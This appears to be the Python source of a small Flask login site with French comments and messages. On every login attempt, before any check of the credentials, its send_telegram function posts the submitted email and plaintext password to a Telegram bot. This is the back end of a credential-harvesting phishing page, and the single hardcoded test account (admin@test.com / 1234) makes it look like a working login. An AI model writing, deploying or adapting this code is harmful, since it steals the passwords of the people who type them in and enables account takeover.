import os
import requests
from flask import Flask, render_template, request, session, redirect, url_for

app = Flask(__name__, template_folder="../templates", static_folder="../static")
app.secret_key = os.environ.get("FLASK_SECRET", "dev-only-change-me")

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

USERS = {
    "admin@test.com": "1234"
}


def send_telegram(name, password):
    if not BOT_TOKEN or not CHAT_ID:
        print("Telegram non configuré")
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"🔐 Nouvelle connexion\n📧 {name}\n🔑 {password}"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print("Telegram error:", e)


# Page d'accueil → affiche index.html
@app.route("/")
def home():
    return render_template("index.html")


# Page de connexion → affiche login.html (GET) ou traite la connexion (POST)
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        name = request.form.get("email")
        password = request.form.get("password")

        # Envoie la notif Telegram
        send_telegram(name, password)

        # Vérifie les identifiants
        if name in USERS and USERS[name] == password:
            session["user"] = name
            return redirect(url_for("dashboard"))
        return "Identifiants incorrects", 401

    return render_template("login.html")


# Page protégée après connexion
@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect(url_for("login"))
    return f"Bienvenue {session['user']} 👋"


# Déconnexion
@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))